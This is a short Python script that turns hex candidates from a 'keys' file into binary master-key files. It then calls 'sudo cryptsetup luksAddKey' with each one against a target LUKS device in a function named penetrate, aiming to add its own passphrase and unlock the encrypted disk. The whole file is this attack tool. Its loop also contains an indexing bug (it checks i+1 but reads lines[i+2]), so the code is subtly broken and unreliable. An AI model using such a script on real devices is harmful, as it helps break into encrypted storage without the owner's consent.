import binascii
import sys
from subprocess import run
from pathlib import Path


def generate():
    with open('keys', 'r') as f_in:
        lines = f_in.readlines()
        for i in range(1, len(lines), 2):
            if i+1 < len(lines):
                p1 = lines[i].strip().replace(" ", "")
                p2 = lines[i+2].strip().replace(" ", "")
                chunk = binascii.unhexlify(p2+p1)
                with open(f"key{i}.bin", 'wb') as f_out:
                    f_out.write(chunk)


def penetrate():
    for file in Path.cwd().rglob("*.bin"):
        p = run(['sudo', 'cryptsetup', 'luksAddKey', f'{device}', '--master-key-file', f'{file}'])
        if p.returncode == 0:
            exit(0)


if __name__ == '__main__':
    if len(sys.argv) > 1:
        device = sys.argv[1]
    else:
        print("Device argument missing")
        exit(1)
    generate()
    penetrate()
